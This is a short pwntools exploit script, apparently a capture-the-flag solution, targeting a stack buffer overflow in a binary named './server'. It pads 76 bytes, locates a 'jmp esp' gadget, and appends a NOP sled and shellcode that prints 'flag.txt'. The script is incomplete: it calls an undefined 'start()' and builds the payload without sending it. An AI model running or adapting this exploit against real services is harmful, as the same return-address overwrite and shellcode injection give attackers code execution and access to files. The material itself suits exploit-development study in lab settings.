from pwn import *

io=start()

padding = 76 # Find using cyclic gdb or ghidra

exe='./server'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

jmp_esp=asm('jmp esp')
jmp_esp=next(elf.search(jmp_esp))

shellcode=asm(shellcraft.cat('flag.txt')) #inside pwntools
shellcode+=asm(shellcraft.exit())

payload=flat(asm('nop')*padding,jmp_esp,asm('nop')*16,shellcode) # nop - no operation instructions, 
